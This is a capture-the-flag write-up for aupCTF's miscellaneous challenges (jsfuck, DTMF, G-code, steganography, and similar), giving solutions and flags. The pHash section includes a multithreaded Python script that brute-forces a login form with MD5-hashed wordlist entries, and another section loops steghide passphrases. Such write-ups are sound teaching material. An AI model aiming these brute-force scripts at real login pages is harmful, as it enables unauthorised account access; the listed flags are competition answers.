# Misc

### **Fun (100pts)** <a href="#fun-100pts" id="fun-100pts"></a>

#### Description <a href="#description" id="description"></a>

**WTF is** [**This**](https://aupctf.s3.eu-north-1.amazonaws.com/f.txt)

#### Approach <a href="#approach" id="approach"></a>

with dcode [cipher identifier](https://www.dcode.fr/cipher-identifier) it’s clear that the text is jsfuck where you can write javascript with only 6 characters **`[][(![]+[])`**

![Untitled](https://about/write-ups/aupctf/misc/1.webp#center)

using [jsfuck decoder](https://www.dcode.fr/jsfuck-language) we can get the flag

![Untitled](https://about/write-ups/aupctf/misc/2.webp#center)

***

**Flag: `aupCTF{j4v45c1pt_but_f*ck3d}`**

***

### **Sanity check (100pts)** <a href="#sanity-check-100pts" id="sanity-check-100pts"></a>

#### Description <a href="#description-1" id="description-1"></a>

Have you checked the [Rules](https://aupctf.live/)

#### Approach <a href="#approach-1" id="approach-1"></a>

flag is in the rules

***

**Flag: `aupCTF{5an1ty-ch3ck}`**

***

### **Zoo (100pts)** <a href="#zoo-100pts" id="zoo-100pts"></a>

#### Description <a href="#description-2" id="description-2"></a>

when was the first ever video uploaded on youtube?.

**Flag format: `aupCTF{epoch}`**

#### Approach <a href="#approach-2" id="approach-2"></a>

we can easily find the time of first video uploaded on youtube because it has a [Wikipedia page](https://en.wikipedia.org/wiki/Me\_at\_the\_zoo)

but the challenge wants the date in epoch (UNIX time), Using [epochConverter](https://www.epochconverter.com/) we can convert the time and get the flag

***

**Flag: `aupCTF{1114313512}`**

***

### **Frequency (100pts)** <a href="#frequency-100pts" id="frequency-100pts"></a>

#### Description <a href="#description-3" id="description-3"></a>

My friend was making a call on his iconic Nokia 3310. Can you figure out who he was calling?

[rec](https://aupctf.s3.eu-north-1.amazonaws.com/rec.wav)

#### Approach <a href="#approach-3" id="approach-3"></a>

with a little googling, you can find that these tunes are DTMF tunes we can decode them [here](http://dialabc.com/sound/detect/)

***

**Flag: `aupCTF{00923456060484}`**

***

### **pHash (200pts)** <a href="#phash--200pts" id="phash--200pts"></a>

#### Description <a href="#description-4" id="description-4"></a>

[login](https://challs.aupctf.live/phash/) [source](https://aupctf.s3.eu-north-1.amazonaws.com/logic.py)

**Hint💡: Who was the character that fans speculated would appear in a “Marvel Show” but ultimately did not make an appearance?**

#### Approach <a href="#approach-4" id="approach-4"></a>

the hint was not very clear only marvel nerds could have guessed it but the name was present in the [marvel.txt](https://github.com/JacksonBates/wordlists/blob/master/marvel.txt) in github

Given in description are login page and its source code, by looking at the source code, it’s clear that we can only obtain the flag under specific conditions. The username must be “admin,” and the password needs to be the MD5 hash of a randomly chosen word from the “marvel.txt” file.

```
from django.shortcuts import render
from django.contrib import messages
import hashlib
import random

with open('marvel.txt', 'r', encoding='utf-8', errors='ignore') as file:
    wordlist = file.read().splitlines().lower()

random_word = random.choice(wordlist)
random_md5 = hashlib.md5(random_word.encode('utf-8')).hexdigest()

def login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        if username == 'admin' and password == random_md5:
            messages.success(request, 'Congratulations! Here is your flag [REDACTED]')
        else:
            messages.error(request, 'Invalid username or password.')

    return render(request, 'phash.html')
```

We can use a Python script to automatically try different passwords on a login page. we’ll use “admin” as the username as given in the source code and the MD5 hash of each word in marvel.txt as the password. it’ll keep trying different passwords until we find the correct one. To speed up the process, we can use multiple threads to handle multiple attempts at the same time.

**here is a simple script that will do the job**

```
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor

def check_password(password):
    username = "admin"
    url = "https://challs.aupctf.live/phash/"

    password = password.strip()
    password_hash = hashlib.md5(password.encode()).hexdigest()

    payload = {
        "username": username,
        "password": password_hash
    }

    response = requests.post(url, data=payload)
    print("Trying... "+password+" hash: "+password_hash)

    if "aupCTF" in response.text:
        print("Password found:", password)

def bruteforce_login():
    with open("list.txt", "r", encoding="utf-8", errors="ignore") as wordlist:
        passwords = wordlist.readlines()

    with ThreadPoolExecutor() as executor:
        executor.map(check_password, passwords)

bruteforce_login()
```

**Result**

```
┌──(kali㉿iasad)-[~/CTFs/aupctf/phash]
└─$ python script.py
-------MORE-------
Trying... electro hash: 827ccb0eea8a706c4c34a16891f84e7b
Trying... sandman hash: f25a2fc72690b780b2a14e140ef6a9e0
Trying... gwen hash: 25f9e794323b453885f5181f1b624d0b
Trying... silverserfer hash: e10adc3949ba59abbe56e057f20f883e
Trying... ghostrider hash: f4f068e71e0d87bf0ad51e6214ab84e9
Trying... nebula hash: 53dd9c6005f3cdfc5a69c5c07388016d
Trying... hulk hash: 74d738020dca22a731e30058ac7242ee
Trying... wanda hash: 4297f44b13955235245b2497399d7a93
Password found: mephisto
Trying... wintersolder hash: d177b4d1d9e6b6fa86521e4b3d00b029
Trying... ironman hash: 596a96cc7bf9108cd896f33c44aedc8a
```

***

**Flag: `aupCTF{y0u-ar3-a-tru3-m4rv3l-f4n}`**

***

### **The circle of life (200pts)** <a href="#the-circle-of-life--200pts" id="the-circle-of-life--200pts"></a>

#### Description <a href="#description-5" id="description-5"></a>

This message was intercepted by our secret agent but we don’t know how to read it. Help us to find secret of the circle.

[file](https://aupctf.s3.eu-north-1.amazonaws.com/circle.gcode)

#### Approach <a href="#approach-5" id="approach-5"></a>

Given code is _G-code, short for “Geometric Code,” it is a programming language used in computer numerical control (CNC) machines to control their movements and operations. It consists of a series of instructions that tell the machine how to perform specific tasks, such as moving the tool along a particular path, cutting or shaping materials, and controlling various machine functions._

There’s a great tool to visualize gcode at [https://ncviewer.com](https://ncviewer.com/).

![Untitled](https://about/write-ups/aupctf/misc/3.webp#center)

***

**Flag: `aupCTF{Ti3_i3_fu9_rig4ht}`**

***

### **Mr white (300pts)** <a href="#mr-white--300pts" id="mr-white--300pts"></a>

#### Description <a href="#description-6" id="description-6"></a>

#### Approach <a href="#approach-6" id="approach-6"></a>

we are given 2 files a jpg and a audio file

listening to the audio file looks like morse code after decoding we got this

![Untitled](https://about/write-ups/aupctf/misc/4.webp#center)

after reversing the audio and listening we find that the audio played is from the famous series **Beaking Bad**

then looking at the other file

looking at `**exif**` data we find a **Comment : where did the protagonist lived ?**

```
┌──(kali㉿iasad)-[~/CTFs/aupctf/mr-white]
└─$ exiftool doc.jpg 
ExifTool Version Number         : 12.57
File Name                       : doc.jpg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Comment                         : where did the protagonist lived ?
Image Width                     : 600
Image Height                    : 337
```

now this is clear that the challenge is about breaking bad we can answer where did the protagonist lived. you can find it with a simple google search. he lived at **albuquerque**

putting albuquerque as password on steghide we found a hidden wordlist

![Untitled](https://about/write-ups/aupctf/misc/5.webp#center)

it is a small wordlist so we can try steghide the audio file with this and yes it worked heisenberg was the password. you can do that with a bash one-liner or python

```
┌──(kali㉿iasad)-[~/CTFs/aupctf/mr-white]
└─$ for password in $(cat wordlist.txt); do steghide extract -sf alchemist.wav -p $password; done

steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
steghide: could not extract any data with that passphrase!
wrote extracted data to "image.gz".
```

looking at the extracted data looks like base64encoded image you can use [online decoder](https://codebeautify.org/base64-to-image-converter) to convert it to image

![Untitled](https://about/write-ups/aupctf/misc/6.webp#center)

its a base64 string upon converting we got a youtube video link which has the flag format in the description

![Untitled](https://about/write-ups/aupctf/misc/7.webp#center)

going back to the wordlist and collecting only first latter from each word we got the flag

***

**Flag: `aupCTF{iamtheonewhoknocks}`**

***
